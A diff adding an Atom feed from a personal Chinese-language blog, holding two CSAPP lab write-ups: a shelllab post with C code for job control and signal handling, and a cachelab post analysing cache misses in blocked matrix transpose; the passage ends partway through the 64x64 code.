@@ -1,0 +1,1858 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://meredith2328.github.io</id>
+    <title>十派的玩具箱</title>
+    <updated>2024-06-27T05:27:19.430Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://meredith2328.github.io"/>
+    <link rel="self" href="https://meredith2328.github.io/atom.xml"/>
+    <subtitle>存着各种各样的不明物体</subtitle>
+    <logo>https://meredith2328.github.io/images/avatar.png</logo>
+    <icon>https://meredith2328.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, 十派的玩具箱</rights>
+    <entry>
+        <title type="html"><![CDATA[CSAPP: shelllab]]></title>
+        <id>https://meredith2328.github.io/post/csapp-shelllab/</id>
+        <link href="https://meredith2328.github.io/post/csapp-shelllab/">
+        </link>
+        <updated>2024-06-27T05:15:58.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>待修改：当前仅仅包含了作业报告的提交内容。</p>
+</blockquote>
+<h2 id="效果">效果</h2>
+<p>以<code>test16</code>为例，其余效果相似。<br>
+<img src="https://meredith2328.github.io/post-images/1719465528078.png" alt="" loading="lazy"></p>
+<h2 id="知识整理">知识整理</h2>
+<p>根据课本，我们在编写信号处理程序时应当遵守以下规则<s>类怪谈</s>：</p>
+<blockquote>
+<ol start="0">
+<li>处理程序要尽可能简单。</li>
+<li>在处理程序中只调用异步信号安全的函数。</li>
+<li>保存和恢复 <code>errno</code>。</li>
+<li><strong>阻塞所有的信号</strong>，保护对共享<strong>全局</strong>数据结构的访问。</li>
+<li>用volatile声明全局变量。</li>
+<li>用sig_atomic_t声明标志。</li>
+</ol>
+</blockquote>
+<p>我们为了阻塞信号，提供的主要函数有：</p>
+<pre><code>/* 初始化 */
+sigset_t mask_all, mask_chld, prev_mask;
+
+Sigfillset(&amp;mask_all); // 将mask_all设置为包含所有信号的mask
+
+Sigemptyset(&amp;mask_chld); 
+Sigaddset(&amp;mask_chld, SIGCHLD); // 将mask_all设置为只包含SIGCHLD的mask
+</code></pre>
+<pre><code>/* 阻塞与取消阻塞 */
+
+// 阻塞所有信号，并将原mask存入prev_mask中
+Sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;prev_mask);
+
+// 只阻塞SIGCHLD信号
+Sigprocmask(SIG_BLOCK, &amp;mask_chld, &amp;prev_mask);
+
+// 取消阻塞所有信号，恢复mask为prev_mask
+Sigprocmask(SIG_SETMASK, &amp;prev_mask, NULL);
+</code></pre>
+<h2 id="eval">eval</h2>
+<h3 id="思路">思路</h3>
+<p>课本（中文）8.4.6节（P525）提供了不回收后台子进程的eval缺陷版本，在此之上加入信号处理：</p>
+<ol>
+<li>改变全局变量前后需要阻塞和取消阻塞全部信号，保证原子性；</li>
+<li>在使用Fork之前阻塞<code>SIGCHLD</code>，防止子进程在<code>fork</code>之后、<code>addjob</code>之前终止并被<code>handler</code>回收。同时要在子进程中取消阻塞<code>SIGCHLD</code>。</li>
+</ol>
+<p>上述两条信号处理是基于下列文档提示的。</p>
+<h3 id="关于信号处理的文档提示">关于信号处理的文档提示</h3>
+<p><strong>eval block:</strong></p>
+<blockquote>
+<p>In eval, the parent must use sigprocmask to block SIGCHLD signals before it forks the child,<br>
+and then unblock these signals, again using sigprocmask after it adds the child to the job list by calling addjob. Since children inherit the blocked vectors of their parents, the child must be sure to then unblock SIGCHLD signals before it execs the new program. The parent needs to block the SIGCHLD signals in this way in order to avoid the race condition where the child is reaped by sigchld handler (and thus removed from the job list) before the parent calls addjob.</p>
+</blockquote>
+<p><strong>process group:</strong></p>
+<blockquote>
+<p>When you run your shell from the standard Unix shell, your shell is running in the foreground process group. If your shell then creates a child process, by default that child will also be a member of the foreground process group. Since typing ctrl-c sends a SIGINT to every process in the foreground group, typing ctrl-c will send a SIGINT to your shell, as well as to every process that your shell created, which obviously isn’t correct. Here is the workaround: After the fork, but before the execve, the child process should call setpgid(0, 0), which puts the child in a new process group whose group ID is identical to the child’s PID. This ensures that there will be only one process, your shell, in the foreground process group. When you type ctrl-c, the shell should catch the resulting SIGINT and then forward it to the appropriate foreground job (or more precisely, the process group that contains the foreground job).</p>
+</blockquote>
+<h3 id="具体实现">具体实现</h3>
+<pre><code class="language-c">void eval(char *cmdline) 
+{
+    char *argv[MAXARGS];
+    char buf[MAXLINE];
+    int bg;
+    pid_t pid;
+
+    strcpy(buf, cmdline); // dest, src
+    bg = parseline(buf, argv);
+    if (argv[0] == NULL)
+        return; // Ignore empty lines
+
+    if (!builtin_cmd(argv)) { // create a new job
+        // init mask_chld = {SIGCHLD};
+        sigset_t mask_all, mask_chld, prev_mask;
+        sigfillset(&amp;mask_all);
+        sigemptyset(&amp;mask_chld);
+        sigaddset(&amp;mask_chld, SIGCHLD);
+
+        /* Fork, addjob */
+        sigprocmask(SIG_BLOCK, &amp;mask_chld, &amp;prev_mask); // Block SIGCHLD, store prev_mask
+        if ((pid = fork()) == 0) { // Child runs user job
+            sigprocmask(SIG_SETMASK, &amp;prev_mask, NULL); // Unblock SIGCHLD in the child
+            setpgid(0, 0); // Note: each child process must have a unique process group ID
+            if (execve(argv[0], argv, environ) &lt; 0) {
+                printf(&quot;%s: Command not found.\n&quot;, argv[0]);
+                exit(0);
+            }
+        }
+        // addjob changes the global variable &quot;pid&quot;, so block all
+        sigprocmask(SIG_BLOCK, &amp;mask_all, NULL);
+        addjob(jobs, pid, bg?BG:FG, cmdline);
+        sigprocmask(SIG_SETMASK, &amp;prev_mask, NULL); // restore prev_mask
+
+        /* printf */
+        // Before operating, block the SIGCHLD
+        sigprocmask(SIG_BLOCK, &amp;mask_chld, NULL);
+        // Parent waits for foreground job to terminate
+        if (!bg) {
+            waitfg(pid);
+        }
+        else {
+            // When doing printf, block all signals
+            sigprocmask(SIG_BLOCK, &amp;mask_all, NULL);
+            printf(&quot;[%d] (%d) %s&quot;, pid2jid(pid), pid, cmdline); // Background
+        }
+        sigprocmask(SIG_SETMASK, &amp;prev_mask, NULL); // After all operations, restore prev_mask
+    }
+    return;
+}
+</code></pre>
+<h2 id="builtin_cmd">builtin_cmd</h2>
+<h3 id="思路-2">思路</h3>
+<p>照猫画虎：课本（中文）8.4.6节。相应结构作用相当于Java语言（C语言的<code>switch</code>不能直接比较字符串）中的<code>switch</code>：</p>
+<pre><code class="language-java">switch (argv[0]){
+	case &quot;quit&quot;:
+	...
+}
+</code></pre>
+<p>注意遵守“规则”，即在使用全局变量 <code>jobs</code> 时阻塞所有信号。</p>
+<h3 id="具体实现-2">具体实现</h3>
+<pre><code class="language-c">int builtin_cmd(char **argv) 
+{
+    /* If first arg is a builtin command (quit, jobs, bg or fg), 
+     * run it and return true.
+     */ 
+    // switch(argv[0]) case &quot;quit&quot;:
+    if (!strcmp(argv[0], &quot;quit&quot;)) /* quit command */
+        exit(0);
+    if (!strcmp(argv[0], &quot;bg&quot;) || !strcmp(argv[0], &quot;fg&quot;)) {
+        /* bg or fg */
+        do_bgfg(argv);
+        return 1;
+    }
+    if (!strcmp(argv[0], &quot;jobs&quot;)) {
+        // Since we access the global variable &quot;jobs&quot;, block all signals.
+        sigset_t mask_all, prev_mask;
+        sigfillset(&amp;mask_all);
+        sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;prev_mask);
+        listjobs(jobs);
+        sigprocmask(SIG_SETMASK, &amp;prev_mask, NULL);
+        return 1;
+    }
+    if (!strcmp(argv[0], &quot;&amp;&quot;)) /* Ignore singleton &amp; */
+        return 1;
+    return 0;     /* not a builtin command */
+}
+</code></pre>
+<h2 id="waitfg">waitfg</h2>
+<h3 id="思路-3">思路</h3>
+<p>参考课本8.5.7节“显式地等待信号”(P543)的相关部分，利用<code>while</code>循环和<code>sigsuspend</code>维护，直到相应前台进程终止（循环是为了保证只能因为该条件停止、而非收到<code>Ctrl-C</code>等对应的信号）时再停止等待。</p>
+<p>由于我们此处等待的<code>job</code>运行在前台，在该进程终止时，首先发出<code>SIGCHLD</code>信号给父进程，父进程此时在<code>sigsuspend</code>（相当于原子的<code>pause</code>），收到信号后，控制从<code>waitfg</code>先转移到<code>handler</code>，<code>handler</code>确认收到该信号对应终止的所有子进程（收到信号意味着至少有一个进程终止）中包含前台进程（见下<code>sigchld_handler</code>中的<code>if (job-&gt;state == FG)</code>），则在“<code>handler</code>运行结束、控制返回<code>waitfg</code>、<code>waitfg</code>的<code>pause</code>因为信号处理程序执行完毕而返回”的之后需要让<code>waitfg</code>跳出循环。因此设置了一个<code>fg_child_flag</code>变量作为循环条件，用于达成上述效果。</p>
+<h3 id="具体实现-3">具体实现</h3>
+<pre><code class="language-c">void waitfg(pid_t pid)
+{
+	sigset_t mask_empty;
+	sigemptyset(&amp;mask_empty);
+	fg_child_flag = 0;
+	while(!fg_child_flag){
+        // hang the process, until we get a signal
+		sigsuspend(&amp;mask_empty);
+	}
+}
+</code></pre>
+<h2 id="sigchld_handler">sigchld_handler</h2>
+<h3 id="课本提示">课本提示</h3>
+<blockquote>
+<p>• The waitpid, kill, fork, execve, setpgid, and sigprocmask functions will come in very handy. The WUNTRACED and WNOHANG options to waitpid will also be useful.<br>
+• When you implement your signal handlers, be sure to send SIGINT and SIGTSTP signals to the entire foreground process group, using ”-pid” instead of ”pid” in the argument to the kill function. The sdriver.pl program tests for this error.<br>
+• One of the tricky parts of the assignment is deciding on the allocation of work between the waitfg and sigchld handler functions. We recommend the following approach:<br>
+– In waitfg, use a busy loop around the sleep function.<br>
+– In sigchld handler, use exactly one call to waitpid.<br>
+While other solutions are possible, such as calling waitpid in both waitfg and sigchld handler, these can be very confusing. It is simpler to do all reaping in the handler.</p>
+</blockquote>
+<h3 id="思路-4">思路</h3>
+<p>照猫画虎：课本（中文）8.5.6节。<br>
+之后按照<code>job</code>结束状态打印相关信息。这些信息是根据<code>sdriver.pl</code>和各<code>trace</code>比对<code>tsh</code>和<code>tshref</code>的结果（记得先<code>make</code>）比较得到的。</p>
+<h3 id="具体实现-4">具体实现</h3>
+<pre><code class="language-c">void sigchld_handler(int sig) 
+{
+    int olderrno = errno, status;
+    sigset_t mask_all, prev_all;
+    pid_t pid;
+
+    sigfillset(&amp;mask_all);
+    while ((pid = waitpid(-1, &amp;status, WNOHANG | WUNTRACED)) &gt; 0) { /* Reap all zombie children */
+        sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all);
+        struct job_t *job = getjobpid(jobs, pid);
+
+		if (job-&gt;state == FG){ // for waitfg
+			fg_child_flag = 1;
+		}
+
+        if (WIFEXITED(status)) { // normal exit
+            deletejob(jobs, pid);
+        }
+        else if (WIFSIGNALED(status)) { // unhandled signal exit
+            printf(&quot;Job [%d] (%d) terminated by signal %d\n&quot;, job-&gt;jid, pid, WTERMSIG(status));
+            deletejob(jobs, pid);
+        }
+        else if (WIFSTOPPED(status)) { // stopped
+            job-&gt;state = ST;
+            printf(&quot;Job [%d] (%d) stopped by signal %d\n&quot;, job-&gt;jid, pid, WSTOPSIG(status));
+        }
+        sigprocmask(SIG_SETMASK, &amp;prev_all, NULL);
+    }
+
+    errno = olderrno;
+}
+</code></pre>
+<h2 id="sigint_handler">sigint_handler</h2>
+<p>参考 <code>trace06</code> 微调输出。</p>
+<p>由于所有的终止情况都包含子进程的终止，子进程终止时会发送<code>SIGCHLD</code>给父进程，所以我们不需要额外写信息输出。</p>
+<pre><code class="language-c">void sigint_handler(int sig) 
+{
+    // to &quot;the foreground job&quot;
+    sigset_t mask_all, prev_all;
+    sigfillset(&amp;mask_all);
+    
+    sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;prev_all);
+    int pid = fgpid(jobs); // global variable: jobs
+    sigprocmask(SIG_SETMASK, &amp;prev_all, NULL);
+
+    if (pid &gt; 0) {
+        kill(-pid, SIGINT);
+        // output is in the sigchld_handler,
+        // since when a child terminates,
+        // the kernel will send a SIGCHLD to the parent.
+    }
+}
+</code></pre>
+<h2 id="sigtstp_handler">sigtstp_handler</h2>
+<p>与<code>sigint_handler</code>基本完全相同。</p>
+<pre><code class="language-c">void sigtstp_handler(int sig) 
+{
+    // almost the same as sigint_handler
+	sigset_t mask_all, prev_mask;
+	sigfillset(&amp;mask_all);
+    
+	sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;prev_mask);
+	int pid = fgpid(jobs);
+	sigprocmask(SIG_SETMASK, &amp;prev_mask, NULL);
+
+	if(pid &gt; 0){
+		kill(-pid, SIGTSTP);
+	}
+}
+</code></pre>
+<h2 id="do_bgfg">do_bgfg</h2>
+<h3 id="思路-5">思路</h3>
+<p>首先获取<code>pid</code>或<code>jid</code>。从<code>builtin_cmd</code>传入的参数是<code>argv*[]</code>，<code>pid</code>或<code>jid</code>保存在<code>argv[1]</code>处，其中<code>jid</code>以<code>'%'</code>打头，可以用<code>atoi(argv[1] + 1)</code>消去该字符。</p>
+<p>在获取到<code>pid</code>或<code>jid</code>后，我们要获取需要被修改状态的进程，即根据<code>pid</code>或<code>jid</code>以及提供的相应封装函数来获取到我们需要切换<code>BG</code>或<code>FG</code>状态的<code>job</code>。</p>
+<p>在获取到<code>job</code>后，<code>bg</code>指令对应切换到<code>BG</code>状态，<code>fg</code>指令对应切换到<code>FG</code>状态并开始<code>waitfg</code>。</p>
+<h3 id="具体实现-5">具体实现</h3>
+<pre><code class="language-c">void do_bgfg(char **argv) 
+{
+    /* Block the signals */
+    sigset_t mask_all, prev_mask;
+	sigfillset(&amp;mask_all);
+	sigprocmask(SIG_SETMASK, &amp;mask_all, &amp;prev_mask);
+    struct job_t *job;
+    int pid;
+
+    /* Match pid/jid, get a pid. */
+    char *id = argv[1];
+	if(id == NULL){ // no PID(num) or JID(%num)
+		printf(&quot;%s command requires PID or %%jobid argument\n&quot;, argv[0]);
+		return;
+	}
+    else if (id[0] == '%') {
+        int jid = atoi(id + 1); // JID, eliminate '%'
+        job = getjobjid(jobs, jid);
+        if (job == NULL) {
+            printf(&quot;%%%d: No such job\n&quot;, jid);
+			return;
+        }
+        pid = job-&gt;pid;
+    }
+    else {
+        pid = atoi(id); // PID
+        if(pid &lt;= 0){
+			printf(&quot;%s: argument must be a PID or %%jobid\n&quot;, argv[0]);
+			return;
+		}
+        job = getjobpid(jobs, pid);
+        if (job == NULL) {
+            printf(&quot;(%d): No such process\n&quot;, pid);
+			return;
+        }
+    }
+
+    /* Switch the command. */
+    if (!strcmp(argv[0], &quot;bg&quot;)) {
+        /* Change a stopped background job to a running background job. */
+        job-&gt;state = BG;
+        printf(&quot;[%d] (%d) %s&quot;, job-&gt;jid, pid, job-&gt;cmdline);
+		sigprocmask(SIG_SETMASK, &amp;prev_mask, NULL); // First stop blocking
+		kill(-pid, SIGCONT); // Signal the child and its descendents
+    }
+	else if (!strcmp(argv[0], &quot;fg&quot;)){
+        /* Change a stopped or running background job to a running in the foreground. */
+		job-&gt;state = FG;
+		sigprocmask(SIG_SETMASK, &amp;prev_mask, NULL);
+		kill(-pid, SIGCONT);
+		waitfg(pid); // Switch to the foreground, wait.
+	}
+}
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CSAPP: cachelab]]></title>
+        <id>https://meredith2328.github.io/post/csapp-cachelab/</id>
+        <link href="https://meredith2328.github.io/post/csapp-cachelab/">
+        </link>
+        <updated>2024-06-05T06:54:18.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>man, what can I say.jpg<br>
+<img src="https://meredith2328.github.io/post-images/1717570490815.png" alt="" loading="lazy"></p>
+</blockquote>
+<h1 id="cachelab">Cachelab</h1>
+<pre><code>python2 driver.py
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://meredith2328.github.io/post-images/1717570680646.png" alt="" loading="lazy"></figure>
+<h2 id="phase1">phase1</h2>
+<p>一开始错理解为只有<code>S</code>指令时才保存cache，忽略了cache本来就是为了访问，所以只要有访问就应该保存cache。将这一点修改之后问题就迎刃而解了。</p>
+<figure data-type="image" tabindex="2"><img src="https://meredith2328.github.io/post-images/1717570672450.png" alt="" loading="lazy"></figure>
+<h2 id="phase2">phase2</h2>
+<p><code>./test-trans -M 32 -N 32</code></p>
+<p>上述指令遇到了</p>
+<pre><code>Function 0 (2 total)
+Step 1: Validating and generating memory traces
+sh: 1: valgrind: not found
+Validation error at function 126! Run ./tracegen -M 32 -N 32 -F 0 for details.
+Skipping performance evaluation for this function.
+</code></pre>
+<p>这样的问题，排查确认是未安装<code>valgrind</code>，利用<code>sudo apt install valgrind</code> 就解决了。</p>
+<h3 id="32-32-关于分块利用局部性的分析">32 * 32: 关于分块利用局部性的分析</h3>
+<h4 id="缓存大小"><strong>缓存大小</strong></h4>
+<p>由于程序中<code>static A, B</code> 部分的相关定义~~（静态链接）~~，<strong>可以认为</strong><code>A</code>、<code>B</code>地址连续（中间无填充），它们对应的<code>Cache</code>的组和行的分布恰好是完全相同的（见下图）（这会造成对角线一定的Conflict Miss，见下）。</p>
+<p>缓存的利用机制如下：</p>
+<p>给出的<code>s = 5, E = 1, b = 5</code> 计算可知对应的Cache大小为<code>2^5 * 1 * 2^5 = 1024</code> Bytes。考虑到<code>int</code>类型为4 Bytes，</p>
+<p>我们对<code>A</code>和<code>B</code>使用的<code>Cache</code>有<code>S = 2^s = 2^5 = 32</code>组，每组有<code>E = 1</code>行，每行存储了<code>8 int</code>的块。</p>
+<p>不妨把这些组的唯一行编号为<code>Line 00</code> 到<code>Line 31</code>，见下图。</p>
+<h4 id="缓存过程分析为什么要分块"><strong>缓存过程分析：为什么要分块？</strong></h4>
+<figure data-type="image" tabindex="3"><img src="https://meredith2328.github.io/post-images/1717570661757.png" alt="" loading="lazy"></figure>
+<p>这个图是我自己画的。形式参考自：<a href="https://zhuanlan.zhihu.com/p/387662272">CSAPP - Cache Lab的更(最)优秀的解法 - 知乎 (zhihu.com)</a>，非常感谢原作者的优秀思考。</p>
+<p>从开头举例，<strong>原始转置操作<code>B[j][i] = A[i][j]</code>指令经历了如下的过程：</strong></p>
+<blockquote>
+<p>读<code>A[0][0]</code>，<code>Line 00</code>中无该值，发生Cold Miss，将<code>A[0][0]</code>到<code>A[0][7]</code> 存入<code>Line 00</code>中。</p>
+<p>写<code>B[0][0]</code>，<code>Line 00</code>中无该值，且该行恰好存了<code>A[0][0]</code>到<code>A[0][7]</code> ，发生Conflict Miss和Eviction，<code>Line 00</code>换为<code>B[0][0]</code>到<code>B[0][7]</code>。（注意取出B时是<strong>行优先</strong>，虽然B是<strong>按列写</strong>的，但我们存入缓存是按内存连续、即按行存的，这是课本中提到的最重要的局部性问题的来源）</p>
+<p>读<code>A[0][1]</code>，<code>Line 00</code>中无该值（上述已<code>Eviction</code>），发生Conflict Miss，将<code>A[0][0]</code>到<code>A[0][7]</code> 存入<code>Line 00</code>中。</p>
+<p>写<code>B[1][0]</code>，<code>Line 04</code>中无该值，发生Cold Miss，将<code>B[1][0]</code>到<code>B[1][7]</code>存入<code>Line 04</code>中。</p>
+<p>读<code>A[0][2]</code>，<code>Line 00</code>中有该值，发生hit。</p>
+<p>写<code>B[2][0]</code>，<code>Line 08</code>中无该值，将<code>B[2][0]</code>到<code>B[2][7]</code>存入<code>Line 08</code>中。</p>
+<p>读<code>A[0][3]</code>，<code>Line 00</code>中有该值，发生hit。</p>
+<p>写<code>B[3][0]</code>，<code>Line 12</code>中无该值，将<code>B[3][0]</code>到<code>B[3][7]</code>存入<code>Line 12</code>中。</p>
+<p>读<code>A[0][4]</code>，<code>Line 00</code>中有该值，发生hit。</p>
+<p>写<code>B[4][0]</code>，<code>Line 16</code>中无该值，将<code>B[4][0]</code>到<code>B[4][7]</code>存入<code>Line 16</code>中。</p>
+<p>...</p>
+<p>读<code>A[0][8]</code>，<code>Line 01</code>中无该值，发生Cold Miss，将<code>A[0][8]</code>到<code>A[0][15]</code> 存入<code>Line 01</code>中。</p>
+<p>写<code>B[8][0]</code>，<code>Line 00</code>中无该值，发生Conflict Miss，将<code>B[8][0]</code>到<code>B[8][7]</code>存入<code>Line 00</code>中。</p>
+<p>...</p>
+</blockquote>
+<p>为了便于理解，我详细阐述了整个过程。利用我们小学<s>或者幼儿园</s>学到的找规律可以知道：</p>
+<ol>
+<li><code>A[i][i]</code>和<code>B[i][i]</code>会引起Conflict Miss。具体而言，写<code>B[i][i]</code>时会驱逐相同的Cache Line，导致<code>A[i][i + 1]</code>冲突不命中。（由于i = 0, 1, ..., 31，共计32次miss）（其实此处分析不完全，见下述第二次改进）</li>
+<li>A具有良好的局部性，只在每读入8个int的第一个才会发生Cold Miss，其余都是Hit。（共计128次miss）</li>
+<li>B的缓存未良好使用，每次写入都会发生Miss。（共计1024次miss）。</li>
+</ol>
+<p>求和即miss总次数为32 + 128 + 1024 - 4（上述1. 与 2.在图中标红处共计4次重复计数） = 1180。</p>
+<p>查询源码可以发现valgrind本身使用了3次miss，即得下述Function 1的misses:1183。</p>
+<h4 id="第一次改进使用8-8分块"><strong>第一次改进：使用8 * 8分块</strong></h4>
+<p>我们在理解了为什么会发生冲突之后，分块的作用就显而易见了。</p>
+<p>首先利用分块解决影响最大的问题：B按列读取，每读入8块时即驱逐之前的缓存。为了解决这个问题，我们可以考虑 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>8</mn><mo>×</mo><mn>8</mn></mrow><annotation encoding="application/x-tex">8 \times 8</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.72777em;vertical-align:-0.08333em;"></span><span class="mord">8</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">8</span></span></span></span>​的分块，在下一次驱逐缓存行之前先完成所有缓存行的传入。</p>
+<pre><code class="language-c">void transpose_submit(int M, int N, int A[N][M], int B[M][N])
+{
+    int i, j, a, b, c, d, e, f, g, h;
+    for (i = 0; i &lt; N; i+=8) {
+        for (j = 0; j &lt; M; j+=8) {
+            // 8 * 8
+            for (int ii = i; ii &lt; i + 8; ii++) {
+                for (int jj = j; jj &lt; j + 8; jj++) {
+                    B[jj][ii] = A[ii][jj];
+                }
+            }
+        }
+    }
+}
+</code></pre>
+<p>得到的结果如下Function 0：</p>
+<figure data-type="image" tabindex="4"><img src="https://meredith2328.github.io/post-images/1717570650830.png" alt="" loading="lazy"></figure>
+<p>相比于原始代码Function 1，已经有了极大改善。</p>
+<h4 id="第二次改进使用局部变量"><strong>第二次改进：使用局部变量</strong></h4>
+<p>之后继续修改，处理对角的conflict miss。</p>
+<p>我们在之前“可以认为”那里发现，如果我们要从<code>A[i][j]</code>转置到<code>B[i][j]</code>即转置相同坐标的元素，会必定驱逐相同的Cache Line，造成冲突不命中。那么什么时候会转置到相同坐标位置呢？显而易见，方阵对角线处，即<code>i == j</code>。</p>
+<p>但是我们按照前述计算的理论值应当为 32 + 128 + 128 = 288次，与340次（显示值misses = 343）仍然相差一定数值，说明我们的分析仍然有问题。这是为什么？</p>
+<p>我们不妨重新仔细分析 8 * 8 分块后A和B分别使用的Cache Line。对于A使用的<code>(x, y)</code> (<code>x</code>, <code>y</code> = 0, 1, 2, 3)块，它对应与B使用的<code>(y, x)</code>块，我们会发现除了<code>x == y</code>的其他情况的对应块所包含的Cache Line都不重合。因此我们大胆猜测，造成这一部分问题的是<strong>对角块冲突</strong>，而非对角线元素冲突。</p>
+<p><strong>当前转置操作经历了如下的过程：</strong></p>
+<blockquote>
+<p>读<code>A[0][0]</code>，<code>Line 00</code>中无该值，发生Cold Miss，将<code>A[0][0]</code>到<code>A[0][7]</code> 存入<code>Line 00</code>中。</p>
+<p>写<code>B[0][0]</code>，<code>Line 00</code>中无该值，且该行恰好存了<code>A[0][0]</code>到<code>A[0][7]</code> ，发生Conflict Miss和Eviction，<code>Line 00</code>换为<code>B[0][0]</code>到<code>B[0][7]</code>。</p>
+<p><strong>读<code>A[0][1]</code>，<code>Line 00</code>中无该值（上述已<code>Eviction</code>），发生Conflict Miss，将<code>A[0][0]</code>到<code>A[0][7]</code> 存入<code>Line 00</code>中。(1)</strong></p>
+<p>写<code>B[1][0]</code>，<code>Line 04</code>中无该值，发生Cold Miss，将<code>B[1][0]</code>到<code>B[1][7]</code>存入<code>Line 04</code>中。</p>
+<p>读<code>A[0][2]</code>，<code>Line 00</code>中有该值，发生hit。</p>
+<p>...</p>
+<p>读<code>A[1][0]</code>，<code>Line 04</code>中无该值，miss，<code>Line 04 := A[1][0..7]</code></p>
+<p><strong>写<code>B[0][1]</code>，<code>Line 00</code>中无该值，miss，<code>Line 00 := B[0][0..7]</code> (2)</strong></p>
+<p>读<code>A[1][1]</code>，<code>Line 04</code>中有该值，hit</p>
+<p><strong>写<code>B[1][1]</code>，<code>Line 04</code>中无该值，miss，<code>Line 04 := B[1][0..7]</code> (3)</strong></p>
+</blockquote>
+<p>我们发现之前分析到的对角线元素、即A和B同一坐标处使用相同行存取的影响分为三部分：</p>
+<ol>
+<li><code>A[i][i + 1]</code>处出现Conflict Miss （上述标号**<code>(1)</code>**），这是因为写<code>B[i][i]</code>时驱逐了<code>A[i][i + 1]</code>本应被缓存到的行。</li>
+<li><code>B[i][i + 1]</code>处出现Conflict Miss（上述标号**<code>(2)</code>**），这是因为写<code>B[i][i + 1]</code>时本应使用上一部分提到的写<code>B[i][i]</code>缓存的行，但它被上一部分读<code>A[i][i + 1]</code>时驱逐了。</li>
+<li><code>B[i][i]</code>处出现Conflict Miss（上述标号**<code>(3)</code>**），这是因为我们在写<code>B[i][i]</code>之前一定会先读<code>A[i][i]</code>导致驱逐。</li>
+</ol>
+<p>上述1、2可以归类为<strong>对角块冲突</strong>造成的影响 <s>相爱相杀</s> ，而3可以归类为<strong>对角线元素冲突</strong>造成的影响。</p>
+<p>由这三部分影响、连同无法避免的Cold Miss造成的所有miss对应A、B矩阵见下两图：</p>
+<p><img src="https://meredith2328.github.io/post-images/1717570641850.png" alt="" loading="lazy"><br>
+<img src="https://meredith2328.github.io/post-images/1717570634679.png" alt="" loading="lazy"></p>
+<p>图片来源：<a href="https://d-sketon.top/20211015/csapp-cachelab/">CSAPP - CacheLab (d-sketon.top)</a></p>
+<p>为了规避上述由对角块造成的1、2问题，我们考虑利用题目所给的共计12个局部变量。对于每一个 8 * 8 分块，可以将<code>A[i][i..(i + 7)]</code>存入8个临时变量中，利用临时变量而非Cache进行转置。</p>
+<p>这样虽然似乎与Cache本身的意义有少许矛盾（甚至有种开挂感），但就优化而言是可行的。优化理论结果 misses = 128 + 128 + 32 = 288。同上-4即得284，与下图（显示值<code>misses = 287</code>）符合。</p>
+<pre><code class="language-c">void transpose_submit(int M, int N, int A[N][M], int B[M][N])
+{
+    int i, j, a, b, c, d, e, f, g, h, k;
+    for (i = 0; i &lt; N; i+=8) {
+        for (j = 0; j &lt; M; j+=8) {
+            // copy the A(i, j) block, row by row. Then paste it to B(j, i).
+            for (int k = 0; k &lt; 8; k++) {
+                a = A[i + k][j];
+                b = A[i + k][j + 1];
+                c = A[i + k][j + 2];
+                d = A[i + k][j + 3];
+                e = A[i + k][j + 4];
+                f = A[i + k][j + 5];
+                g = A[i + k][j + 6];
+                h = A[i + k][j + 7];
+                B[j][i + k] = a;
+                B[j + 1][i + k] = b;
+                B[j + 2][i + k] = c;
+                B[j + 3][i + k] = d;
+                B[j + 4][i + k] = e;
+                B[j + 5][i + k] = f;
+                B[j + 6][i + k] = g;
+                B[j + 7][i + k] = h;
+            }
+        }
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="5"><img src="https://meredith2328.github.io/post-images/1717570623218.png" alt="" loading="lazy"></figure>
+<h3 id="64-64">64 * 64</h3>
+<p>有了上述分析，本次只需多尝试不同的分块方法、再思考做优化即迎刃而解了。</p>
+<figure data-type="image" tabindex="6"><img src="./assets/%E5%8C%BA%E5%9D%97%E7%94%A8%E5%88%B0%E7%9A%84%E7%BB%84.jpg" alt="区块用到的组" loading="lazy"></figure>
+<p>图片来源：<a href="https://zhuanlan.zhihu.com/p/387662272">CSAPP - Cache Lab的更(最)优秀的解法 - 知乎 (zhihu.com)</a>，虽然之前感谢过一次了，但再次感谢原作者的优秀思考。</p>
+<p>看图发现 8 * 8 的分块内部上下两部分存在冲突，所以考虑继续缩小分块，先用 4 * 4分块尝试：</p>
+<pre><code class="language-c">    if (M == 64) {
+        for (int i = 0; i &lt; N; i += 4) {
+            for (int j = 0; j &lt; M; j += 4) {
+                // copy the A(i, j) block, row by row. Then paste it to B(j, i).
+                for (int k = 0; k &lt; 4; k++) {
+                    a = A[i + k][j];
+                    b = A[i + k][j + 1];
+                    c = A[i + k][j + 2];
+                    d = A[i + k][j + 3];
+                    B[j][i + k] = a;
+                    B[j + 1][i + k] = b;
+                    B[j + 2][i + k] = c;
+                    B[j + 3][i + k] = d;
+                }
+            }
+        }
+    }
+</code></pre>
+<p>结果如下：</p>
+<figure data-type="image" tabindex="7"><img src="https://meredith2328.github.io/post-images/1717570614606.png" alt="" loading="lazy"></figure>
+<p>结果未达到1300以下，考虑继续优化。</p>
+<p>是否可以利用 4 * 8 的分块呢？4 * 8的分块内部的确不存在冲突，可以充分利用A的局部性，但置于B之后就不可以了。由此我们思考：是否可以先将A的 4 * 8 块置于B的相同位置、再将其中不在对角线上、需要转置的4 * 4块转置过来，如是操作，以相比于上述 4 * 4 分块的方式更好利用A的局部性？</p>
+<p>代码如下：</p>
+<pre><code class="language-c">if (M == 64) {
+        for (int i = 0; i &lt; N; i += 8) {
+            for (int j = 0; j &lt; M; j += 8) {
+                
+                for (int k = i; k &lt; i + 4; k++) {
+                    // copy the A(i, j) 4 * 8 block(4 * 4 block 1, 2), row by row.
